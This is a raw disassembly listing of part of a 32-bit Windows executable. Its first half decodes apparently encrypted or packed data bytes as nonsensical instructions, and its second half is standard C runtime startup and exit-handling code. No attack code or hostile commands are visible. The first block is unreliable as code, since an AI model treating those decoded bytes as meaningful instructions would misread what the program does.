  4224c8:	adc    DWORD PTR [esi*8+0x989052c],esp
  4224cf:	stos   BYTE PTR es:[edi],al
  4224d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224d1:	int    0xa0
  4224d3:	js     0x422487
  4224d5:	xchg   edx,eax
  4224d6:	(bad)  
  4224d8:	sub    al,0xd4
  4224da:	adc    ebx,DWORD PTR [ecx+edi*2+0x4b]
  4224de:	ret    0xbbfc
  4224e1:	jg     0x42252e
  4224e3:	sbb    al,0x92
  4224e5:	sar    BYTE PTR [ebx-0x6],1
  4224e8:	pop    ebx
  4224e9:	adc    ebp,DWORD PTR [ecx-0xf8c20e7]
  4224ef:	cmp    al,0xe8
  4224f1:	lds    edi,FWORD PTR [esi-0x80]
  4224f4:	imul   ebp,eax,0xffffff95
  4224f7:	aas    
  4224f8:	cmp    BYTE PTR [ebx],dh
  4224fa:	(bad)  
  4224fb:	test   DWORD PTR [eax],0x5ac0f650
  422501:	ins    BYTE PTR es:[edi],dx
  422502:	sbb    ch,BYTE PTR [esi]
  422504:	mov    dl,0xc3
  422506:	fnstenv [ebp+eax*8+0x2a07b1e6]
  42250d:	mov    bh,0x2d
  42250f:	sar    DWORD PTR [edx],0x78
  422512:	and    al,0x50
  422514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422515:	fidivr DWORD PTR [ebp-0x2e699152]
  42251b:	shr    DWORD PTR [ebx+edi*8],1
  42251e:	out    dx,eax
  42251f:	push   ecx
  422520:	or     BYTE PTR [edi+ebp*1],ah
  422523:	inc    esi
  422524:	inc    ecx
  422525:	test   eax,0xc12d7a46
  42252a:	or     al,0x89
  42252c:	fucomp st(2)
  42252e:	add    BYTE PTR [ebx-0x4ec34fed],dh
  422534:	push   edi
  422535:	lds    esp,FWORD PTR [edi-0x4e]
  422538:	add    DWORD PTR [eax-0x5b],eax
  42253b:	stc    
  42253c:	pop    eax
  42253d:	fwait
  42253e:	(bad)  
  42253f:	sbb    dl,bh
  422541:	jge    0x422571
  422543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422544:	enter  0xbecb,0xdc
  422548:	mov    al,0x5e
  42254a:	or     ch,BYTE PTR [ecx+edx*2-0x40]
  42254e:	xchg   BYTE PTR [eax],ch
  422550:	dec    esp
  422551:	push   cs
  422552:	mov    ch,0x7f
  422554:	(bad)  
  422556:	mov    edx,0xbf735dd4
  42255b:	call   0x28b6a1a5
  422560:	into   
  422561:	inc    eax
  422562:	xor    al,0xd2
  422564:	pushf  
  422565:	dec    eax
  422566:	je     0x42259d
  422568:	pop    ebx
  422569:	pop    ds
  42256a:	push   eax
  42256b:	les    esp,FWORD PTR [esi+0x4f]
  42256e:	push   0x51
  422570:	dec    esp
  422571:	repz mov ss,eax
  422574:	lds    esi,FWORD PTR [esi+0x5a]
  422577:	loopne 0x42254a
  422579:	push   cs
  42257a:	ficomp WORD PTR [esi-0x3f3e6287]
  422580:	and    BYTE PTR [ecx-0x1aed46e4],dh
  422586:	push   es
  422587:	(bad)
  42258a:	mov    dl,0xb1
  42258c:	(bad)  
  42258e:	dec    edi
  42258f:	repz loopne 0x422542
  422592:	fwait
  422593:	les    esi,FWORD PTR [eax]
  422595:	retf   0xdac4
  422598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422599:	scas   eax,DWORD PTR es:[edi]
  42259a:	xchg   edi,eax
  42259b:	inc    edi
  42259c:	adc    al,0x1b
  42259e:	adc    al,bh
  4225a0:	sbb    esi,eax
  4225a2:	adc    eax,0xb73ee1c6
  4225a7:	int    0xf0
  4225a9:	push   0x5f
  4225ab:	sahf   
  4225ac:	lock xchg ecx,eax
  4225af:	mov    esp,0x18011e9e
  4225b4:	mov    ebx,0x984eb3ad
  4225b9:	int3   
  4225ba:	mov    esp,es
  4225bc:	sbb    DWORD PTR [edi],ecx
  4225be:	xchg   ebx,eax
  4225bf:	fs sahf 
  4225c1:	add    al,0x73
  4225c3:	mul    esp
  4225c5:	outs   dx,DWORD PTR ds:[esi]
  4225c6:	sbb    al,0x84
  4225c8:	sbb    cl,BYTE PTR [edx-0x6d4bc8bc]
  4225ce:	mov    ecx,0x577dffcb
  4225d3:	call   0xcfd2:0x86844c97
  4225da:	mov    dh,0xc8
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	aam    0x8e
  4225df:	out    dx,eax
  4225e0:	ins    BYTE PTR es:[edi],dx
  4225e1:	int    0x29
  4225e3:	repnz mov eax,0xe2abee2c
  4225e9:	leave  
  4225ea:	sbb    dh,BYTE PTR [eax-0x38541ad4]
  4225f0:	jecxz  0x4225ba
  4225f2:	cmc    
  4225f3:	add    BYTE PTR [ebx],0x3d
  4225f6:	mov    al,ds:0xb33cb6d1
  4225fb:	popf   
  4225fc:	or     BYTE PTR [eax],cl
  4225fe:	ja     0x422627
  422600:	lods   al,BYTE PTR ds:[esi]
  422601:	mov    bl,0xf2
  422603:	fs (bad) 
  422605:	aam    0xc9
  422607:	outs   dx,DWORD PTR ds:[esi]
  422608:	test   al,0x7f
  42260a:	and    al,0xa0
  42260c:	jnp    0x42266f
  42260e:	outs   dx,DWORD PTR ds:[esi]
  42260f:	scas   al,BYTE PTR es:[edi]
  422610:	fsubr  DWORD PTR [edx+0x44590e5c]
  422616:	retf   
  422617:	push   0x49
  422619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42261a:	gs sbb esp,esp
  42261d:	jmp    0x422663
  42261f:	js     0x4225e0
  422621:	pop    es
  422622:	xor    bh,bl
  422624:	sbb    esi,eax
  422626:	cmp    al,0xe1
  422628:	mov    bl,0x53
  42262a:	aas    
  42262b:	mov    edi,0x37cda8e2
  422630:	dec    esp
  422631:	push   ds
  422632:	sar    BYTE PTR [ebp-0x1865191f],cl
  422638:	xchg   esi,eax
  422639:	rcpps  xmm6,xmm2
  42263c:	(bad)  
  42263d:	jmp    0x5cc5:0x7a88427b
  422644:	pop    ebp
  422645:	push   ds
  422646:	jl     0x4225dd
  422648:	ret    0xf9f0
  42264b:	mov    cl,0x67
  42264d:	arpl   cx,bx
  42264f:	cmc    
  422650:	xlat   BYTE PTR ds:[ebx]
  422651:	daa    
  422652:	fidivr WORD PTR [ecx-0x66]
  422655:	and    eax,0xe74d047
  42265a:	js     0x4226bf
  42265c:	inc    eax
  42265d:	rcl    DWORD PTR [eax+0x536f1226],1
  422663:	stos   BYTE PTR es:[edi],al
  422664:	cmc    
  422665:	jmp    0xfefa:0xa3af268e
  42266c:	aaa    
  42266d:	push   cs
  42266e:	out    0xe3,al
  422670:	xor    DWORD PTR [esi],esi
  422672:	test   DWORD PTR [ebp+0x3016f12e],eax
  422678:	jns    0x42261c
  42267a:	xchg   edx,eax
  42267b:	add    eax,0x7df67c2d
  422680:	sbb    BYTE PTR [edx+0x6e],cl
  422683:	stos   DWORD PTR es:[edi],eax
  422684:	push   cs
  422685:	daa    
  422686:	lds    ebp,FWORD PTR [edx+0x1ba0b5d2]
  42268c:	ret    
  42268d:	pop    edx
  42268e:	push   edx
  42268f:	pop    edi
  422690:	pop    es
  422691:	push   esp
  422692:	test   BYTE PTR [ecx+0x26724e9],al
  422698:	pop    es
  422699:	mov    esi,0xe535c8ec
  42269e:	lods   eax,DWORD PTR ds:[esi]
  42269f:	mov    eax,ds:0xf3a88ec7
  4226a4:	les    ebp,FWORD PTR [edx]
  4226a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a7:	or     DWORD PTR [edi],ebp
  4226a9:	gs out 0x97,al
  4226ac:	sbb    BYTE PTR [esi+ebx*8+0x1ae1fd97],bh
  4226b3:	mov    ebp,0xc729e27a
  4226b8:	ds mov ch,0xcb
  4226bb:	in     eax,dx
  4226bc:	les    eax,FWORD PTR [ebx+0xae2d747]
  4226c2:	xchg   ebx,eax
  4226c4:	and    esp,esi
  4226c6:	mov    ah,0xae
  4226c8:	fist   DWORD PTR [edx+ecx*8+0x5d]
  4226cc:	dec    esp
  4226cd:	jbe    0x422738
  4226cf:	xchg   ebp,eax
  4226d0:	mov    ebp,0x1ef45cc7
  4226d5:	(bad)  
  4226d6:	mov    DWORD PTR [esi],ebp
  4226d8:	xchg   BYTE PTR ds:0x72df0bcb,ch
  4226de:	xchg   ebp,eax
  4226df:	push   esp
  4226e0:	daa    
  4226e1:	outs   dx,DWORD PTR ds:[esi]
  4226e2:	cmp    al,0xf2
  4226e4:	xchg   esi,eax
  4226e5:	(bad)  
  4226e6:	arpl   WORD PTR [eax+0x6],sp
  4226e9:	push   0xffffff87
  4226eb:	ficomp DWORD PTR [esi-0x3f727133]
  4226f1:	dec    ebp
  4226f2:	sbb    edx,esi
  4226f4:	ret    0xe1ac
  4226f7:	pushf  
  4226f8:	xchg   DWORD PTR [eax+ebx*8-0x35204cd0],eax
  4226ff:	aas    
  422700:	jecxz  0x4226c7
  422702:	cmp    DWORD PTR [edi-0x5d095dde],ebx
  422708:	clc    
  422709:	bound  eax,QWORD PTR ds:0xb6a3b3ac
  42270f:	mov    edi,0x3a505eea
  422714:	cmp    BYTE PTR [ebp+esi*4-0x2f3169ed],bl
  42271b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42271c:	add    DWORD PTR [ebx],0xc63d5a2c
  422722:	pop    ds
  422723:	cmp    DWORD PTR [eax+0x4b617a48],ecx
  422729:	cld    
  42272a:	fadd   st,st(3)
  42272c:	mov    edi,0x3d8bc8ce
  422731:	mov    WORD PTR [ecx],es
  422733:	out    dx,al
  422734:	jbe    0x4226fd
  422736:	and    eax,0x97d9ff27
  42273b:	add    BYTE PTR [edx-0x21],ah
  42273e:	or     BYTE PTR [eax],al
  422740:	mov    al,ds:0x2476ed4
  422745:	xor    BYTE PTR [eax],al
  422747:	aam    0xe6
  422749:	stos   BYTE PTR es:[edi],al
  42274a:	outs   dx,DWORD PTR ds:[esi]
  42274b:	mov    dl,BYTE PTR [edi]
  42274d:	push   ebx
  42274e:	xchg   ebx,eax
  42274f:	daa    
  422750:	sub    ecx,esi
  422752:	xchg   esi,eax
  422753:	imul   esp,DWORD PTR [ecx],0x58
  422756:	test   BYTE PTR [ecx+0x55],dh
  422759:	imul   ecx,esi,0x95a1afad
  42275f:	js     0x4226e5
  422761:	aam    0x99
  422763:	jns    0x4227c7
  422765:	ins    BYTE PTR es:[edi],dx
  422766:	ret    0x936e
  422769:	data16 mov al,ds:0x3032b51
  42276f:	inc    ebp
  422770:	loopne 0x422759
  422772:	jl     0x42278d
  422774:	cs sub eax,0x9c2e1126
  42277a:	xor    BYTE PTR [ecx],0xd7
  42277d:	cld    
  42277e:	lods   eax,DWORD PTR ds:[esi]
  42277f:	add    eax,0x6b2d988c
  422784:	jnp    0x4227bb
  422786:	xchg   ecx,eax
  422787:	dec    esp
  422788:	mov    eax,ds:0x6eade03a
  42278d:	dec    edx
  42278e:	fs xchg edi,eax
  422790:	inc    eax
  422791:	popa   
  422792:	xchg   ebx,eax
  422793:	fadd   QWORD PTR [esi]
  422795:	clc    
  422796:	push   eax
  422797:	fld    DWORD PTR [esi+0x3]
  42279a:	mov    esi,0x98798274
  42279f:	(bad)  
  4227a0:	push   esi
  4227a1:	rcr    BYTE PTR ds:0xd4388062,0xf0
  4227a8:	icebp  
  4227a9:	mov    ecx,0xa8a5161
  4227ae:	(bad)  
  4227af:	js     0x4227c3
  4227b1:	or     ch,BYTE PTR [edi+0x3d]
  4227b4:	leave  
  4227b5:	xchg   ecx,eax
  4227b6:	mov    dl,0x52
  4227b8:	push   esp
  4227b9:	xchg   BYTE PTR [eax],bh
  4227bb:	pop    ecx
  4227bc:	sbb    ch,bh
  4227be:	(bad)  
  4227bf:	call   0x3702:0x29beacfa
  4227c6:	jecxz  0x42275b
  4227c8:	mov    esp,0x4c005c5d
  4227cd:	mov    bh,0x45
  4227cf:	dec    edi
  4227d0:	xchg   edi,eax
  4227d1:	cmp    eax,ebp
  4227d3:	xchg   esi,eax
  4227d4:	fldcw  WORD PTR [esi+0x66915616]
  4227da:	add    al,0x9b
  4227dc:	push   edi
  4227dd:	popf   
  4227de:	in     al,dx
  4227df:	mov    ebx,0xc0fc90e8
  4227e4:	retf   
  4227e5:	xor    ebx,edi
  4227e7:	or     ah,ch
  4227e9:	data16 gs mov dh,0xda
  4227ed:	sub    ch,BYTE PTR [ebx]
  4227ef:	mov    ebx,0xccc72623
  4227f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227f5:	enter  0xe117,0x49
  4227f9:	dec    edi
  4227fa:	ins    DWORD PTR es:[edi],dx
  4227fb:	cld    
  4227fc:	and    dh,BYTE PTR [esi-0xd197f71]
  422802:	leave  
  422803:	jecxz  0x4227aa
  422805:	xor    BYTE PTR [edi+ebx*4-0x303dcc3f],ah
  42280c:	dec    edx
  42280d:	and    dh,bl
  42280f:	pop    ecx
  422810:	leave  
  422811:	sub    eax,0x137674bc
  422816:	inc    esp
  422817:	and    BYTE PTR [esi+0x52f5f3b8],bl
  42281d:	out    0x24,al
  42281f:	(bad)  
  422820:	cld    
  422821:	sahf   
  422822:	xchg   esi,eax
  422823:	nop
  422824:	xchg   esi,eax
  422825:	xchg   ebp,eax
  422826:	xchg   DWORD PTR [ebx],esi
  422828:	(bad)  
  422829:	pop    esp
  42282a:	int3   
  42282b:	and    ecx,DWORD PTR [esi-0x50]
  42282e:	pop    eax
  42282f:	add    esp,esi
  422831:	mov    cl,0x3d
  422833:	std    
  422834:	pop    eax
  422835:	push   ebp
  422836:	(bad)  
  422838:	pop    ebx
  422839:	cmp    BYTE PTR [bp-0xd],dh
  42283d:	or     BYTE PTR [ebx],dl
  42283f:	jg     0x4227de
  422841:	xlat   BYTE PTR ds:[ebx]
  422842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422843:	cmp    ecx,edx
  422845:	clc    
  422846:	test   BYTE PTR [edi-0x7ea4ad5c],cl
  42284c:	lahf   
  42284d:	shl    DWORD PTR [esi+edx*2+0x232a678a],0x3
  422855:	inc    edx
  422856:	arpl   WORD PTR [ecx-0x216fb639],si
  42285c:	mov    ecx,0x1bdafa1d
  422861:	out    0x75,eax
  422863:	aam    0x22
  422865:	adc    dh,BYTE PTR [ebx+0x6334f6af]
  42286b:	xchg   esi,eax
  42286c:	aad    0x7f
  42286e:	(bad)  
  42286f:	scas   eax,DWORD PTR es:[edi]
  422870:	fldenv [edx-0x38045af6]
  422876:	cdq    
  422877:	push   ebx
  422878:	fscale 
  42287a:	retf   
  42287b:	or     BYTE PTR [ebp+0x6b],0xa2
  42287f:	sub    DWORD PTR [edx+0x68770e53],esp
  422885:	les    ebx,FWORD PTR [edi+eax*2+0x1]
  422889:	rol    BYTE PTR [ecx-0x38c42ab3],cl
  42288f:	add    DWORD PTR [ecx-0x7c7d569d],ecx
  422895:	test   BYTE PTR [esi],al
  422897:	jecxz  0x4228c8
  422899:	stos   BYTE PTR es:[edi],al
  42289a:	mov    eax,ds:0x84882841
  42289f:	(bad)  
  4228a0:	inc    edx
  4228a1:	ret    
  4228a2:	dec    edx
  4228a3:	retf   0xfd3c
  4228a6:	mov    eax,ds:0xeafdcf1d
  4228ab:	cdq    
  4228ac:	fild   QWORD PTR [ebp+0x2d46426a]
  4228b2:	xchg   ecx,eax
  4228b3:	mov    dl,0x42
  4228b5:	aad    0x79
  4228b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228b8:	add    bh,BYTE PTR [ebp-0x75]
  4228bb:	jl     0x42285b
  4228bd:	adc    eax,0xf78fc0de
  4228c2:	pop    edi
  4228c3:	xchg   BYTE PTR cs:[ecx-0x3],dl
  4228c7:	dec    edi
  4228c8:	adc    ebp,DWORD PTR [edx-0x1b]
  4228cb:	or     DWORD PTR [ecx],ebx
  4228cd:	adc    BYTE PTR [edi],ah
  4228cf:	int3   
  4228d0:	imul   edi,esi,0xffffffd1
  4228d3:	jae    0x42289f
  4228d5:	add    ch,BYTE PTR [ecx]
  4228d7:	ins    DWORD PTR es:[edi],dx
  4228d8:	shl    BYTE PTR [ebp+0x16],0x34
  4228dc:	(bad)
  4228e0:	(bad)  
  4228e2:	(bad)  
  4228e3:	jmp    0x86add474
  4228e8:	and    al,0x57
  4228ea:	pop    esp
  4228eb:	xchg   DWORD PTR [ebx-0x572efb4],esp
  4228f1:	pop    ss
  4228f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228f3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4228f5:	add    eax,0x9bda4872
  4228fa:	imul   edi,DWORD PTR [ebx],0xa68f2a94
  422900:	std    
  422901:	repnz popa 
  422903:	out    0x2f,eax
  422905:	pushf  
  422906:	cmp    ah,BYTE PTR [eax]
  422908:	inc    ebp
  42290a:	xor    ecx,ebx
  42290c:	gs jns 0x42295c
  42290f:	mov    dh,0xe2
  422911:	dec    edi
  422912:	pop    ss
  422913:	stos   DWORD PTR es:[edi],eax
  422914:	sti    
  422915:	xor    eax,eax
  422917:	mov    esp,ebp
  422919:	pop    ebp
  42291a:	ret    0x10
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
